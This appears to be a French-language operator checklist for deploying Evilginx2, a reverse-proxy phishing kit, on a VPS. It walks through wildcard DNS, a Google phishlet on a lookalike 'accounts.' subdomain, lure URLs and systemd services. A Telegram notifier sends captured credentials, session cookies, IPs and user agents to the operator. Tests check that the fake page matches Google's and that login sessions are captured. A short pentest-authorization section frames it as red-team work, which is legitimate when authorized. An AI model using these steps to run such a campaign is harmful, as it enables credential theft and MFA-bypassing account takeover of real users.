# ✅ CHECKLIST DE DÉPLOIEMENT VPS

## 📋 AVANT LE DÉPLOIEMENT

### Prérequis matériels

- [ ] VPS loué (DigitalOcean, Vultr, OVH, etc.)
- [ ] Minimum 2 GB RAM, 2 CPU cores
- [ ] Ubuntu 20.04+ ou Debian 11+
- [ ] Accès root SSH configuré
- [ ] IP publique notée : `___________________`

### Prérequis logiciels

- [ ] Domaine acheté : `___________________`
- [ ] Accès au panneau DNS du registrar
- [ ] Bot Telegram créé via @BotFather
- [ ] Token Telegram noté : `___________________`
- [ ] Chat ID Telegram noté : `___________________`

---

## 🚀 INSTALLATION

### Phase 1 : Connexion et préparation

- [ ] Connexion SSH réussie : `ssh root@IP_VPS`
- [ ] Mise à jour système : `apt update && apt upgrade -y`
- [ ] Repository cloné dans `/opt`
- [ ] Script d'installation exécuté : `bash scripts/install_vps.sh`

### Phase 2 : Installation automatique

- [ ] Go installé et fonctionnel
- [ ] Evilginx2 compilé sans erreur
- [ ] Phishlets copiés (8 fichiers)
- [ ] Environnement Python configuré
- [ ] Services systemd créés

---

## ⚙️ CONFIGURATION

### Configuration Telegram

- [ ] Fichier édité : `/opt/evilginx-pro-collection/scripts/telegram_notifier.py`
- [ ] `TELEGRAM_BOT_TOKEN` modifié
- [ ] `TELEGRAM_CHAT_ID` modifié
- [ ] Test d'envoi Telegram réussi

### Configuration DNS

- [ ] Enregistrement A créé : `@ → IP_VPS`
- [ ] Enregistrement Wildcard créé : `* → IP_VPS`
- [ ] Propagation DNS vérifiée : `dig @8.8.8.8 domaine.com`
- [ ] Temps d'attente respecté (5-10 minutes)

### Configuration Pare-feu

- [ ] Port 22 ouvert (SSH)
- [ ] Port 80 ouvert (HTTP)
- [ ] Port 443 ouvert (HTTPS)
- [ ] UFW activé : `ufw status`

---

## 🎯 CONFIGURATION EVILGINX

### Lancement initial

- [ ] Evilginx lancé : `cd /opt/evilginx2 && ./evilginx -p /root/.evilginx/phishlets`
- [ ] Domaine configuré : `: config domain votre-domaine.com`
- [ ] IP configurée : `: config ip IP_VPS`

### Configuration du phishlet (exemple Google)

- [ ] Hostname défini : `: phishlets hostname google accounts.votre-domaine.com`
- [ ] Phishlet activé : `: phishlets enable google`
- [ ] Certificat SSL obtenu automatiquement
- [ ] Lure créé : `: lures create google`
- [ ] URL de phishing générée : `: lures get-url 0`
- [ ] URL notée : `___________________`

---

## 🔧 SERVICES SYSTEMD

### Démarrage des services

- [ ] Service Evilginx démarré : `systemctl start evilginx`
- [ ] Service Telegram démarré : `systemctl start telegram_notifier`
- [ ] Auto-démarrage activé pour Evilginx
- [ ] Auto-démarrage activé pour Telegram

### Vérification des services

- [ ] Statut Evilginx : `systemctl status evilginx`
- [ ] Statut Telegram : `systemctl status telegram_notifier`
- [ ] Pas d'erreurs dans les logs
- [ ] Services marqués comme "active (running)"

---

## ✅ TESTS DE VALIDATION

### Test technique

- [ ] Page de phishing accessible : `https://accounts.votre-domaine.com/LURE`
- [ ] Certificat SSL valide (cadenas vert)
- [ ] Page identique à l'original Google
- [ ] Pas d'erreurs console (F12)
- [ ] Chargement des ressources correct

### Test fonctionnel

- [ ] Formulaire de login affiché
- [ ] Test avec credentials factices
- [ ] Redirection post-login fonctionnelle
- [ ] Pas de message d'erreur visible

### Test de capture

- [ ] Credentials capturés dans Evilginx : `: sessions`
- [ ] Cookies capturés et valides
- [ ] Notification Telegram reçue
- [ ] Informations complètes dans Telegram (IP, User-Agent, etc.)

---

## 📊 MONITORING

### Surveillance des logs

- [ ] Logs Evilginx consultés : `journalctl -u evilginx -f`
- [ ] Logs Telegram consultés : `journalctl -u telegram_notifier -f`
- [ ] Pas d'erreurs critiques
- [ ] Logs fonctionnent en temps réel

### Vérification système

- [ ] Espace disque suffisant : `df -h`
- [ ] RAM disponible : `free -h`
- [ ] Charge CPU acceptable : `htop`
- [ ] Connexions réseau : `netstat -tulpn`

---

## 🔒 SÉCURISATION

### Hardening SSH

- [ ] Port SSH changé (optionnel) : `/etc/ssh/sshd_config`
- [ ] Authentification par clé configurée
- [ ] Root login désactivé (après création d'un user)
- [ ] Fail2ban installé et configuré

### Sauvegardes

- [ ] Script de backup créé
- [ ] Base de données sauvegardée : `/root/.evilginx/data.db`
- [ ] Configuration sauvegardée
- [ ] Backup planifié (cron)

### Mises à jour

- [ ] Mises à jour automatiques activées
- [ ] Evilginx à jour : `cd /opt/evilginx2 && git pull`
- [ ] Collection à jour : `cd /opt/evilginx-pro-collection && git pull`

---

## 📚 DOCUMENTATION

### Documents consultés

- [ ] README principal lu
- [ ] Guide de déploiement VPS consulté
- [ ] Guide de structure des phishlets lu
- [ ] Guide Telegram lu

### Commandes importantes notées

- [ ] Redémarrer Evilginx : `systemctl restart evilginx`
- [ ] Voir les sessions : `: sessions` (dans Evilginx)
- [ ] Voir les logs : `journalctl -u evilginx -f`
- [ ] Mode interactif : `cd /opt/evilginx2 && ./evilginx -p /root/.evilginx/phishlets`

---

## ⚠️ CONFORMITÉ LÉGALE

### Autorisations

- [ ] Autorisation écrite obtenue pour les tests
- [ ] Scope du pentest défini
- [ ] Dates de la mission notées
- [ ] Contact client disponible

### Documentation

- [ ] Rapport de mission préparé
- [ ] Captures d'écran effectuées
- [ ] Données sensibles sécurisées
- [ ] Plan de destruction des données établi

---

## 🎯 POST-DÉPLOIEMENT

### Après la mission

- [ ] Sessions capturées exportées
- [ ] Phishlets désactivés : `: phishlets disable google`
- [ ] Services arrêtés : `systemctl stop evilginx telegram_notifier`
- [ ] Base de données nettoyée
- [ ] VPS détruit ou réinitialisé

### Rapport final

- [ ] Nombre de sessions capturées : `_____`
- [ ] Taux de succès : `_____%`
- [ ] Problèmes rencontrés documentés
- [ ] Recommandations de sécurité rédigées

---

## 📝 NOTES PERSONNELLES

```
Date de déploiement : ___________________
Domaine utilisé      : ___________________
Phishlet déployé     : ___________________
Client/Mission       : ___________________

Observations :
_________________________________________________
_________________________________________________
_________________________________________________
_________________________________________________

Incidents :
_________________________________________________
_________________________________________________
_________________________________________________
_________________________________________________
```

---

## ✅ VALIDATION FINALE

- [ ] **TOUS** les éléments ci-dessus sont cochés
- [ ] Aucune erreur critique non résolue
- [ ] Tests de validation réussis
- [ ] Documentation complète
- [ ] Autorisations légales en place
- [ ] Système opérationnel et stable

---

**Date de validation** : ********\_\_\_********

**Signature** : ********\_\_\_********

---

**🎉 Déploiement VPS validé et opérationnel !**

_Checklist créée le 6 janvier 2026_  
_Compatible Evilginx2 3.0+ | Ubuntu 20.04+ | Debian 11+_
